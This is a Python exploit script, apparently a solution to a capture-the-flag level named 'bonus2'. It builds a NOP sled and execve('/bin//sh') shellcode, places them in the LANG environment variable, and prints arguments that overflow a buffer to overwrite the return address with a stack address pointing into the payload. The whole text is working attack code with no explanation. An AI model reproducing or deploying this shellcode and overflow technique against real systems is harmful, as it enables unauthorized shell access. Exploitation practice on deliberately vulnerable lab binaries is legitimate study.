#!/usr/bin/env python3

import struct

def p(x): return struct.pack('<I', x)

shellcode = (b"\x90" * 100) + b"\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"

payload = b"fi"
payload += shellcode

def printable(c): return c >= 0x20 and c <= 0x7e
    
print("export LANG=$'", end="")
for c in payload:
    if printable(c):
        print("%c" % c, end="")
    else:
        print("\\x%02x" % c, end="")

print("'")

args = "./bonus2 aAaBaCaDaEaFaGaHaIaJaKaLaMaNaOaPaQaRaSaTaUaVaWaXaYaZ bAbBbCbDbEbFbGbHbI$'"
print(args, end="")

args = p(0xbffffebc + 50)
for c in args:
    if printable(c):
        print("%c" % c, end="")
    else:
        print("\\x%02x" % c, end="")
print("'")
